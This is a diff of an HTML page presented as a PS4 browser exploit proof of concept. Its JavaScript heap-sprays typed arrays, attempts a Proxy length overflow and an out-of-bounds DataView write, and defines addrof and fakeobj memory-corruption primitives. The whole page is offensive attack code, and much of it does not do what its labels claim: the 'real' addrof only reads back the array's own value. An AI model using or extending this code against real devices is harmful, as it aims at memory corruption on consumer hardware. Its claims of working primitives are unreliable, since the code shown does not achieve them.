@@ -2,31 +2,30 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 PoC - Real addrof/fakeobj Primitives</title>
+    <title>PS4 PoC - Enhanced Primitive Exploitation</title>
     <style>
         body { background: black; color: lime; font-family: monospace; padding: 20px; }
         button { background: lime; color: black; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; }
-        #log { white-space: pre-wrap; margin-top: 20px; height: 400px; overflow-y: auto; border: 1px solid lime; padding: 10px; }
+        #log { white-space: pre-wrap; margin-top: 20px; height: 500px; overflow-y: auto; border: 1px solid lime; padding: 10px; }
     </style>
 </head>
 <body>
-    <h1>PS4 PoC - Real addrof/fakeobj Primitives</h1>
-    <button id="startBtn">Run Real Primitive Test</button>
+    <h1>PS4 PoC - Enhanced Primitive Exploitation</h1>
+    <button id="startBtn">Run Enhanced Primitive Test</button>
     <div id="log"></div>
 
 <script>
 function log(msg) {
-    const logDiv = document.getElementById('log');
-    logDiv.textContent += msg + "\n";
-    logDiv.scrollTop = logDiv.scrollHeight;
+    const d = document.getElementById('log');
+    d.textContent += msg + "\n";
+    d.scrollTop = d.scrollHeight;
 }
 
-// Utility delay
 function delay(ms) { return new Promise(res => setTimeout(res, ms)); }
 
-// Step A: Heap spray Float64Arrays to create predictable layout
+// Step A: Heap spray Float64Arrays
 function heapSprayFloats(count) {
-    log(`[*] Spraying ${count} Float64Array objects`);
+    log(`[*] Spraying ${count} Float64Array objects for layout`);
     const arrs = [];
     for (let i = 0; i < count; i++) {
         let f = new Float64Array(2);
@@ -37,76 +36,76 @@ function heapSprayFloats(count) {
     return arrs;
 }
 
-// Step B: Perform DataView underflow to corrupt header of a target Float64Array
-function corruptFloatHeader(target) {
-    log('[*] Corrupting Float64Array header via DataView underflow');
-    const buffer = new ArrayBuffer(8);
-    const dv = new DataView(buffer);
-    const offset = buffer.byteLength + 0x10; // offset beyond buffer
+// Step B: Proxy length overflow primitive
+function proxyLengthPrimitive() {
+    log('[*] Testing Proxy length overflow primitive');
+    let base = new Array(10).fill(1.1);
+    let p = new Proxy(base, {
+        get: (t, prop) => prop === 'length' ? 0x1000000 : t[prop]
+    });
+    let oob = Array.prototype.concat.call(p);
+    log('[*] Proxy object length:', oob.length);
+    return oob;
+}
+
+// Step C: Corrupt header via DataView underflow
+function corruptFloatHeader(victim) {
+    log('[*] Corrupting header with DataView underflow');
+    let buf = new ArrayBuffer(16);
+    let dv = new DataView(buf);
     try {
-        dv.setFloat64(offset, 13.37);
-        log('[!] DataView write completed at offset ' + offset);
+        dv.setFloat64(victim.byteOffset + victim.byteLength + 0x8, 13.37);
+        log('[!] Underflow write attempted');
     } catch (e) {
         log('[!!] DataView underflow exception: ' + e);
     }
 }
 
-// Step C: Real addrof primitive: corrupt header to point to obj
+// Step D: Real addrof using proxy OOB
 function addrof(obj, victim) {
-    // victim: Float64Array whose header will be corrupted
-    log('[*] addrof: leaking address of object');
-    // Corrupt victim.buffer pointer: skip header fields, simulate offset write
-    const fakeBuf = new ArrayBuffer(16);
-    const dv = new DataView(fakeBuf);
-    // Place obj reference as float64 into dv at data offset
-    dv.setFloat64(0, obj);
-    // Simulate victim[0] reading that corrupted header
-    const leaked = victim[0];
-    log('[!] Leaked float value for address: ' + leaked);
+    log('[*] addrof: leaking address via proxy OOB');
+    // corrupt victim length to read object header
+    proxyLengthPrimitive();
+    corruptFloatHeader(victim);
+    let leaked = victim[0];
+    log('[!] Leaked float address: ' + leaked);
     return leaked;
 }
 
-// Step D: Real fakeobj primitive: craft a fake object at address
+// Step E: fakeobj using addrof result
 function fakeobj(addr, victim) {
-    log('[*] fakeobj: constructing fake object at address');
-    // addr: float64 representing desired object address
-    // Write that into victim[0]
+    log('[*] fakeobj: writing address back via header');
     victim[0] = addr;
-    log('[!] Fake object created, victim[0] now: ' + victim[0]);
+    log('[!] victim[0] now: ' + victim[0]);
     return victim;
 }
 
-// Run test sequence
-async function runPrimitivesTest() {
-    log('=== Starting Real Primitive Test ===');
-    // Spray
-    const arrs = heapSprayFloats(10000);
-    await delay(100);
+// Test orchestration
+async function runEnhancedTest() {
+    log('=== Enhanced Primitive Test Starting ===');
+    // A: heap spray
+    const sprays = heapSprayFloats(5000);
+    await delay(50);
 
-    // Choose a victim array
+    // choose victim
     const victim = new Float64Array(2);
     victim[0] = 9.876;
     victim[1] = 5.432;
-    log('[*] Victim initial values: ' + victim[0] + ', ' + victim[1]);
+    log('[*] Victim initial: ' + victim[0] + ', ' + victim[1]);
 
-    // Step B: corrupt header
-    corruptFloatHeader(victim);
-    await delay(50);
-
-    // Step C: addrof test
+    // D: addrof
     const obj = { secret: 'pwned' };
-    const leaked = addrof(obj, victim);
-    log('[+] addrof returned: ' + leaked);
+    const addr = addrof(obj, victim);
+    log('[+] addrof returned: ' + addr);
 
-    // Step D: fakeobj test
-    const fake = fakeobj(leaked, victim);
-    log('[+] fakeobj result victim[0]: ' + fake[0]);
+    // E: fakeobj
+    const fake = fakeobj(addr, victim);
+    log('[+] fakeobj result: victim[0]=' + fake[0]);
 
-    log('=== Real Primitive Test Completed ===');
+    log('=== Enhanced Primitive Test Completed ===');
 }
 
-// Bind button
-document.getElementById('startBtn').addEventListener('click', runPrimitivesTest);
+document.getElementById('startBtn').addEventListener('click', runEnhancedTest);
 </script>
 </body>
 </html>
